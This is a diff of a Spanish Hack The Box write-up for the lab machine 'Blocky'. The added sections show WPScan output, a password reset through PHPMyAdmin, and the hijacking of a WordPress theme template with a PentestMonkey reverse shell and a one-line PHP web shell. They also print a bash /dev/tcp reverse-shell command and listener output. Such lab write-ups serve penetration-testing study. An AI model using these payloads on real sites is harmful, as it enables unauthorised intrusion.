@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Blocky - Hack The Box
-excerpt: "Esta es una máquina bastante sencilla, en donde haremos un Fuzzing y gracias a este descubriremos archivos de Java, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como Root. Además de que aprendemos a enumerar los usuarios del servicio SSH, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit CVE-2018-15473."
+excerpt: "Esta es una máquina bastante sencilla, en donde haremos un Fuzzing y gracias a este descubriremos archivos de Java, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como Root. Además de que aprendemos a enumerar los usuarios del servicio SSH, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit CVE-2018-15473. También nos aprovecharemos de Wordpress y PHPMyAdmin, para probar algunas formas de ganar acceso a la máquina."
 date: 2023-02-20
 classes: wide
 header:
@@ -15,29 +15,35 @@ tags:
   - Linux
   - Virtual Hosting
   - Fuzzing
+  - PHP
+  - Wordpress
   - Information Leakage
-  - Java Decompiler 
-  - SUDO Exploitation
+  - Java Decompiler
+  - Wordpress Enumeration
+  - Abusing Wordpress Template
+  - Reverse Shell 
+  - Abusing Sudoers Privileges
   - SSH Username Enumeration
   - CVE-2018-15473
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-blocky/blocky_logo.png)
 
-Esta es una máquina bastante sencilla, en donde haremos un **Fuzzing** y gracias a este descubriremos archivos de **Java**, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como **Root**. Además de que aprendemos a enumerar los usuarios del servicio **SSH**, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit **CVE-2018-15473**.
+Esta es una máquina bastante sencilla, en donde haremos un **Fuzzing** y gracias a este descubriremos archivos de **Java**, que al descompilar uno de ellos contendrá información critica que nos ayudará a loguearnos como **Root**. Además de que aprendemos a enumerar los usuarios del **servicio SSH**, es decir, sabremos si estos existen o no en ese servicio gracias al Exploit **CVE-2018-15473**. También nos aprovecharemos de **Wordpress** y **PHPMyAdmin**, para probar algunas formas de ganar acceso a la máquina.
 
 Herramientas utilizadas:
-* **
-* **
-* **
-* **
-* **
-* **
+* *nmap*
+* *whatweb*
+* *wappalizer*
+* *wfuzz*
+* *gobuster*
+* *jd-gui*
+* *wpscan*
+* *python2*
+* *ssh*
+* *nc*
+* *sudo*
 
-
-Cosas por hacer:
-AGREGAR FUZZING CON GOBUSTER
-USAR LA HERRAMIENTA WPSCAN
 
 <br>
 <hr>
@@ -52,16 +58,27 @@ USAR LA HERRAMIENTA WPSCAN
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#Fuzz">Fuzzing</a></li>
+				<li><a href="#Java">Analizando Archivo .jar</a></li>
+				<li><a href="#wpscan">Utilizando la Herramienta WPScan</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
-		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
 				<li><a href="#SSH">Forma de Enumerar Usuarios de SSH</a></li>
 				<ul>
                                         <li><a href="#PruebaExp">Probando Exploit: OpenSSH < 7.7 - Username Enumeration (2)</a></li>
                                 </ul>
+				<li><a href="#SSH2">Probando Contraseña Encontrada en Servicio SSH</a></li>
+				<li><a href="#PHP">Ganando Acceso a Máquina Usando PHPMyAdmin y Wordpress</a></li>
+				<ul>
+					<li><a href="#PHP2">Suplantando Código de Template con Código de Reverse Shell de PentestMonkey para Ganar Acceso</a></li>
+					<li><a href="#PHP3">Suplantando Código de Template para Obtener una CMD</a></li>
+				</ul>
+			</ul>
+		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#Enum">Enumeración de Máquina y Escalando Privilegios</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -247,19 +264,19 @@ Vemos un post y podemos verlo mejor si damos click, entremos.
 <img src="/assets/images/htb-writeup-blocky/Captura6.png">
 </p>
 
-Una vez dentro, podemos comentar también, pero lo importante es que arriba del post aparece un usuario llamado **notch**, supongo que ese debe estar registrado en la página. Vamos al login.
+Una vez dentro, podemos comentar también, pero lo importante es que arriba del post aparece un usuario llamado **notch**, supongo que ese debe estar registrado en la página. Vamos al login de **Wordpress**.
 
 <p align="center">
 <img src="/assets/images/htb-writeup-blocky/Captura7.png">
 </p>
 
-Va, una vez aquí intentemos ver si existe el usuario notch:
+Va, una vez aquí intentemos ver si existe el **usuario notch**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-blocky/Captura8.png">
 </p>
 
-¡Si existe! Puede que ese usuario este registrado en el **SSH**, solo nos falta la contraseña. Ahora hagamos un Fuzzing para saber que otras subpáginas hay.
+¡Si existe! Puede que ese usuario este registrado en el **SSH**, solo nos falta la contraseña. Ahora hagamos un **Fuzzing** para saber que otras subpáginas hay.
 
 <h2 id="Fuzz">Fuzzing</h2>
 
@@ -317,7 +334,7 @@ Requests/sec.: 432.3768
 
 <br>
 
-Bien, ahora probemos con Gobuster:
+Bien, ahora probemos con **Gobuster**:
 ```bash
 gobuster dir -u http://blocky.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20
 ===============================================================
@@ -392,7 +409,7 @@ Bien, como nos indica ahí, vamos a cargar los archivos, primero veamos el **Blo
 <img src="/assets/images/htb-writeup-blocky/Captura12.png">
 </p>
 
-Si no mal recuerdo de mis autoclases de Java, el cuadro amarillo debe ser una clase, veamos que contenido tiene:
+Si no mal recuerdo de mis autoclases de **Java**, el cuadro amarillo debe ser una clase, veamos que contenido tiene:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-blocky/Captura13.png">
@@ -408,9 +425,108 @@ Waos, ya tenemos un usuario y la contraseña del Root, quiza **notch** es el Roo
 
 <h2 id="wpscan">Utilizando la Herramienta WPScan</h2>
 
+Antes de seguir avanzando, me gustaría probar una nueva herramienta que no había probado antes. Esta es una herramienta bastante útil, a la hora de buscar vulnerabilidades dentro de un **Wordpress**.
 
+| **Herramienta WPScan** |
+|:-----------:|
+|*WPScan es un software de código abierto para Kali Linux, diseñado para escanear vulnerabilidades y fallos en un sitio web de WordPress. WPScan es una herramienta muy poderosa y capaz de darte información detallada sobre una página web. Con ella, puedes auditar sistemas, verificar su estado y corregir cada fallo que encuentres antes de que lo aproveche un delincuente.*|
 
+<br>
 
+Vamos a utilizarla para ver que nos reporta:
+```bash
+wpscan --url http://blocky.htb
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://blocky.htb/ [10.10.10.37]
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://blocky.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://blocky.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
+ |  - http://blocky.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
+ | Last Updated: 2024-04-02T00:00:00.000Z
+ | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 3.6
+ | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:03 <============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:03
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Requests Done: 139
+[+] Cached Requests: 37
+[+] Data Sent: 33.996 KB
+[+] Data Received: 19.874 KB
+[+] Memory used: 258.684 MB
+[+] Elapsed time: 00:00:10
+```
+No nos reporta algo que nos pueda ser de utilidad de momento, aunque lo de los **Template** me da una idea. Bueno, sigamos con la explotación.
 
 
 <br>
@@ -514,7 +630,7 @@ OK, ya nada más se ve el resultado.
 
 Esta es una forma de saber si existe un usuario en un **servicio SSH**, para el futuro puede que nos sirva este Exploit.
 
-<h2 id="SSH">Probando Contraseña Encontrada en Servicio SSH</h2>
+<h2 id="SSH2">Probando Contraseña Encontrada en Servicio SSH</h2>
 
 Intentemos loguearnos con el usuario **notch**:
 ```bash
@@ -556,9 +672,9 @@ notch@Blocky:~$ cat user.txt
 ```
 Excelente, ya tenemos la flag del usuario, ahora falta convertirnos en Root.
 
-<h2 id="PHP">Ganando Acceso a Máquina Usando PHPMyAdmin</h2>
+<h2 id="PHP">Ganando Acceso a Máquina Usando PHPMyAdmin y Wordpress</h2>
 
-Si recuerdas, hay dos logins de PHP, pero la contraseña y el usuario que encontramos, sirven para el login de PHPMyAdmin, así que vamos a probarlas:
+Antes de continuar, si recuerdas, hay dos logins, uno de **Wordpress** y otro de **PHP**, pero la contraseña y el usuario que encontramos, sirven para el login de **PHPMyAdmin**, así que vamos a probarlas:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-blocky/Captura15.png">
@@ -568,10 +684,166 @@ Si recuerdas, hay dos logins de PHP, pero la contraseña y el usuario que encont
 <img src="/assets/images/htb-writeup-blocky/Captura16.png">
 </p>
 
+Excelente, dentro podemos ver que hay muchas cosillas que podemos modificar, la base de datos de **MySQL**, el **Wordpress**, etc. Abre la pestaña del **Wordpress**:
 
-Excelente, dentro podemos ver que hay 
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura17.png">
+</p>
 
+Observa que hay una sección de usuarios, entra ahí:
 
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura18.png">
+</p>
+
+Desde aquí, podemos cambiar la contraseña del **usuario Notch** a una que nosotros queramos.
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura19.png">
+</p>
+
+Vamos a hacerlo por pasos:
+
+* Edita el **usuario Notch**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura20.png">
+</p>
+
+* Ve a la casilla **user_pass**, pon una contraseña que quieras y ponle una **función de encriptado MD5**, cuando termines, dale al **botón de go**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura22.png">
+</p>
+
+* Ahora, prueba la contraseña en el login de **Wordpress**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura23.png">
+</p>
+
+Excelente, ahora para poder ganar acceso a la máquina, vamos a ir a la sección de **Appearance** y de ahí a **Editor**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura24.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura25.png">
+</p>
+
+Desde ahí, nosotros podemos modificar los **Templates** que tendran las publicaciones, esto con **código PHP**, así que podemos aprovechar para usar cualquiera de esos temas, para modificarlo y meter código malicioso. 
+
+Vamos a modificar el primero, el **404 Template**, vamos a jugar un poco en esta parte.
+
+<br>
+
+<h3 id="PHP2">Suplantando Código de Template con Código de Reverse Shell de PentestMonkey para Ganar Acceso</h3>
+
+Entra en el **404 Template**:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura26.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura27.png">
+</p>
+
+Elimina el contenido y suplantalo por el contenido de la Reverse Shell de PentestMonkey:
+
+* https://github.com/pentestmonkey/php-reverse-shell
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura28.png">
+</p>
+
+Modifica la IP con la tuya y el puerto que quieras usar, guarda los cambios:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura29.png">
+</p>
+
+Abre una **netcat** con el puerto que utilizaste en la **Reverse Shell**:
+```bash
+nc -nvlp 443
+listening on [any] 443 ...
+```
+
+Ahora, necesitamos entrar en el **Template**, la ruta que se estan usando para los **Templates**, puede que sea la que aparece al principio de la sección **Editor**, vamos a probarla:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura30.png">
+</p>
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura31.png">
+</p>
+
+Si fue correcta, nos debío de conectar a la máquina víctima en la **netcat**:
+```bash
+nc -nvlp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.37] 37292
+Linux Blocky 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 01:21:13 up  2:23,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+Listo, esta fue otra forma de ganar acceso. No te olvides de hacer un tratamiento de la TTY para que sea más comodo, y puedas usar más funciones de la terminal.
+
+<br>
+
+<h3 id="PHP3">Suplantando Código de Template para Obtener una CMD</h3>
+
+De igual forma que el ejemplo anterior, vamos a modificar el código en PHP del mismo **Template** con el siguiente:
+```php
+<?php
+	system($_REQUEST['cmd']);
+?>
+```
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura32.png">
+</p>
+
+Guarda los cambios y entra en la misma **URL** que utilizamos antes, añade **?cmd=whoami** y observa la magia:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura33.png">
+</p>
+
+De esta forma, podemos mandar una **cmd de bash** hacia una **netcat**.
+
+Primero abre la **netcat**:
+```bash
+nc -nvlp 443
+listening on [any] 443 ...
+```
+E introduce el siguiente comando en la **URL**:
+```bash
+Original:
+bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'
+
+URL:
+bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'
+```
+
+Ya solamente observa la **netcat**:
+```bash
+nc -nvlp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [10.10.10.37] 37294
+bash: cannot set terminal process group (1460): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Blocky:/var/www/html/wp-content/themes/twentyseventeen$ whoami
+whoami
+www-data
+www-data@Blocky:/var/www/html/wp-content/themes/twentyseventeen$
+```
+Y listo, una forma más de ganar acceso que ya habiamos visto antes, aplicada en esta máquina.
 
 
 <br>
@@ -626,6 +898,7 @@ root@Blocky:~# cat root.txt
 * https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
 * https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_enumusers/
 * https://www.exploit-db.com/exploits/45233
+* https://github.com/pentestmonkey/php-reverse-shell
 
 
 <br>
